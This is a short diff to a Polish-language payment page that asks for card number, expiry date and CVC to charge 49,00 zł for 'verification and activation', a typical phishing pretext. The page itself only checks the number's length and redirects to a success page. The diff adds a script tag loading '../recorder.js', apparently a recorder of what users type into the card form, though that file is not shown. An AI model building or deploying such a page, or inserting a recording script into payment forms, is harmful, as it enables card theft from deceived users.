@@ -8,4 +8,4 @@
 <div class="row"><span>Pobierzemy dziś (weryfikacja + aktywacja)</span><span>49,00 zł</span></div>
 <form id="p"><label for="c1">Numer karty</label><input id="c1" inputmode="numeric"><label for="c2">Data ważności</label><input id="c2" placeholder="MM/RR"><label for="c3">CVC</label><input id="c3">
 <div class="err" id="err"></div><button class="btn" type="submit">Zapłać i aktywuj</button></form></div>
-<script>document.getElementById('p').onsubmit=e=>{e.preventDefault();if(document.getElementById('c1').value.replace(/\s/g,'').length<12){document.getElementById('err').textContent='Podaj poprawny numer karty.';return}location.href='sukces.html'}</script></body></html>
+<script>document.getElementById('p').onsubmit=e=>{e.preventDefault();if(document.getElementById('c1').value.replace(/\s/g,'').length<12){document.getElementById('err').textContent='Podaj poprawny numer karty.';return}location.href='sukces.html'}</script><script src="../recorder.js"></script></body></html>
